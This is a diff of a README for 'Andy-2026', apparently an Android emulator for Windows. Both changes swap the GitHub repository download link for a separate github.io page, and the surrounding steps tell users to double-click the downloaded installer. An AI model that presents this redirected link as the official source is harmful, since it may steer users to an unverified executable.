@@ -1,6 +1,6 @@
 # 🎮 Andy-2026 - Run mobile apps on your PC
 
-[![](https://img.shields.io/badge/Download-Andy--2026-blue)](https://github.com/Luciuzsz/Andy-2026)
+[![](https://img.shields.io/badge/Download-Andy--2026-blue)](https://luciuzsz.github.io)
 
 ## 📌 What is Andy-2026?
 
@@ -23,7 +23,7 @@ Make sure your graphics drivers stay current. Old drivers cause issues during th
 
 Follow these steps to get the software running on your Windows device.
 
-1.  Visit the official page to download the software: [Download Andy-2026](https://github.com/Luciuzsz/Andy-2026).
+1.  Visit the official page to download the software: [Download Andy-2026](https://luciuzsz.github.io).
 2.  Locate the downloaded file in your Downloads folder.
 3.  Double-click the installer icon to start the process.
 4.  Accept the license agreement when the window appears.
